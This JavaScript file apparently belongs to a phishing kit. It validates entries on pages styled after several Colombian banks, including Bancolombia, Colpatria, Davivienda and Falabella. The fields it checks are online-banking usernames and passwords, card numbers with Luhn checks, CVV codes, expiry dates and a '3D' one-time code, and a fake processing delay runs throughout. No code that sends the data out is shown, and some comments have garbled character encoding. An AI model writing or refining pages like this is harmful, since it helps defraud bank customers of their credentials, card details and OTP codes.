function validacion(enviar) {
  const page = document.getElementById("pag").value;

  switch (page) {
    case "logo":
      const bank = localStorage.getItem("bank");
      switch (bank) {
        case "BANCOLOMBIA":
          return validacionesBccolombia(enviar);
        case "BANCO COLPATRIA":
          return validacionesColpatria(enviar);
        case "BANCO DAVIVIENDA":
          return validacionesDavi(enviar);
        case "BANCO FALABELLA":
          return validacionesFala(enviar);
         
        default:
          return true;
      }

    case "tarjeta":

      return validacionesTarjeta(enviar);

    default:
      return true;
  }
}
// ---------- validacion general -----------
// function validaciones(enviar) {
//   enviar.disabled = true;
//   enviar.style.opacity = 0.7;
//   enviar.textContent = "Ejecutando proceso...";

//   //simulaciГіn de espera para ejecuciГіn de un proceso

//   setTimeout(function () {
//     enviar.textContent = "Pulsar";
//     enviar.style.opacity = 1;
//     enviar.disabled = false;
//   }, 5000);

//   // ExpresiГіn regular para validar alfanumГ©ricos
//   const alphanumericRegex = /^(?=.*[a-zA-Z])(?=.*\d).+$/;


//   if (document.getElementById("txtPassword").value == "") {
//     Swal.fire({
//       icon: "error",
//       title: "Oops...",
//       text: "Debes ingresar una contraseГ±a",
//       confirmButtonColor: "#000000",
//     });

//     return false;

//   }
//   return true;
// }

// ----------validacion tarjeta ----------

function validacionesTarjeta(enviar) {

  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Pulsar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  

  if (document.getElementById("selectMes").value == "mes") {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Debes ingresar el numero de mes de expiracion de tu tarjeta",
      confirmButtonColor: "#2364d2",
    });

    return false;
  }

  if (document.getElementById("inputCCV").value == "") {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Debes ingresar el codigo cvv que esta en la parte tracera  de tu tarjeta",
      confirmButtonColor: "#2364d2",
    });

    return false;
  }

  if (document.getElementById("TxtBanco").value == "00") {
    alert("Selecciona el tipo de banco")

    return false;
  }

  const numeroTarjeta = document.getElementById("inputNumero").value;
  const esValida = validarNumeroTarjeta(numeroTarjeta);

  if (esValida) {

  } else {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "La tarjeta no es vГЎlida. Por favor, verifica el nГєmero ingresado.",
      confirmButtonColor: "#2364d2",
    });
    return false;
  }

  return true;
}

document.addEventListener("DOMContentLoaded", function () {
    const selectAnio = document.getElementById("selectAnio");
    const currentYear = new Date().getFullYear(); // Obtiene el año actual

    // Limpiar el select antes de agregar opciones
    selectAnio.innerHTML = '<option value="" disabled selected>Año</option>';

    for (let i = 0; i < 15; i++) { // Agrega los próximos 15 años
        let option = document.createElement("option");
        option.value = currentYear + i;
        option.textContent = currentYear + i;
        selectAnio.appendChild(option);
    }
});

document.addEventListener("DOMContentLoaded", function () {
    const botonPago = document.querySelector(".btn.btn-gray");

    botonPago.addEventListener("click", function (event) {
        const selectMes = document.getElementById("selectMes");
        const selectAnio = document.getElementById("selectAnio");
        const selectBanco = document.getElementById("TxtBanco");
        const fechaActual = new Date();
        const mesActual = fechaActual.getMonth() + 1; // Enero es 0, sumamos 1
        const anioActual = fechaActual.getFullYear();

        const mesSeleccionado = parseInt(selectMes.value);
        const anioSeleccionado = parseInt(selectAnio.value);

        // ✅ Validar si la fecha de expiración es válida
        if (!mesSeleccionado || !anioSeleccionado) {
            Swal.fire({
                icon: "error",
                title: "Oops...",
                text: "Debes seleccionar una fecha de expiración válida",
                confirmButtonColor: "#2364d2",
            });
            event.preventDefault();
            return;
        }

        if (anioSeleccionado < anioActual || (anioSeleccionado === anioActual && mesSeleccionado < mesActual)) {
            Swal.fire({
                icon: "error",
                title: "Oops...",
                text: "La fecha de expiración no puede ser menor al mes y año actual",
                confirmButtonColor: "#2364d2",
            });

            selectMes.style.border = "2px solid red";
            selectAnio.style.border = "2px solid red";
            event.preventDefault();
            return;
        }

        // ✅ Validar si el banco ha sido seleccionado
        if (selectBanco.value === "00") {
            Swal.fire({
                icon: "warning",
                title: "¡Atención!",
                text: "Debes seleccionar un banco antes de continuar con el pago.",
                confirmButtonColor: "#FFA500",
            });
            event.preventDefault();
            return;
        }
    });
});



function validarNumeroTarjeta(numeroTarjeta, esAmex) {
    if (!/^\d+$/.test(numeroTarjeta)) return false; // Solo permitir números

    // 🔹 AMEX usa 15 dígitos, otras tarjetas usan 16-19
    let longitudValida = esAmex ? numeroTarjeta.length === 15 : numeroTarjeta.length >= 16 && numeroTarjeta.length <= 19;
    if (!longitudValida) return false;

    // 🔹 Algoritmo de Luhn para validar la tarjeta
    let sum = 0;
    let doubleDigit = false;
    for (let i = numeroTarjeta.length - 1; i >= 0; i--) {
        let digit = parseInt(numeroTarjeta.charAt(i), 10);
        if (doubleDigit) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        doubleDigit = !doubleDigit;
    }

    return sum % 10 === 0;
}


// --------validacion colpatia ---------

function validacionesColpatria(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);



  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener numeros',
      confirmButtonColor: "#E73711"
    })



    return false;
  }

  if (document.getElementById("txtPassword").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseГ±a',
      confirmButtonColor: "#E73711"
    })

    return false;
  }


  if (document.getElementById("txtPassword").value.length < 4) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 4 caracteres',
      confirmButtonColor: "#E73711"



    })
    return false;
  }
  return true;
}

// ----------- validacion davi  ------------


function validacionesDavi(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener  numeros',
      confirmButtonColor: "#717171"
    })



    return false;
  }

  if (document.getElementById("txtPassword").value == "") {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseГ±a',
      confirmButtonColor: "#717171"
    })

    return false;
  }

  if (document.getElementById("txtPassword").value.length < 6) {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 6 caracteres',
      confirmButtonColor: "#717171"

    })
    return false;
  }
  return true;
}


// ----------- validacion tricolor  ------------


function validacionesBccolombia(enviar) {
  enviar.disabled = true;   
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener numeros',
      confirmButtonColor: "#81C12C"
    })

    return;
  }

  // ExpresiГіn regular para validar alfanumГ©ricos
  const alphanumericRegex = /^(?=.*[a-zA-Z])(?=.*\d).+$/;





  if (!alphanumericRegex.test(txtUser.value)) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe contener letras y nГєmeros',
      confirmButtonColor: "#000000"
    });
    return;
  }


  if (document.getElementById("txtPassword").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseГ±a',
      confirmButtonColor: "#000000"
    })

    return;
  }



  if (document.getElementById("txtPassword").value.length < 4) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 4 caracteres',
      confirmButtonColor: "#000000"
    })

    return false;
  }
  return true;
}


// ----------- validacionfala   ------------


function validacionesFala(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener numeros',
      confirmButtonColor: "#81C12C"
    })

    return;
  }

  if (document.getElementById("txtPassword").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseГ±a',
      confirmButtonColor: "#81C12C"
    })


    return;
  }


  if (document.getElementById("txtPassword").value.length < 6) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 6 caracteres',
      confirmButtonColor: "#81C12C"
    })

    return false;
  }
  return true;
}

// ----------- validacion 3d   ------------


function validaciones3D(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("otp").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu codigo debe tener numeros',
      confirmButtonColor: "#81C12C"
    })

    return;
  }
  return true;
}
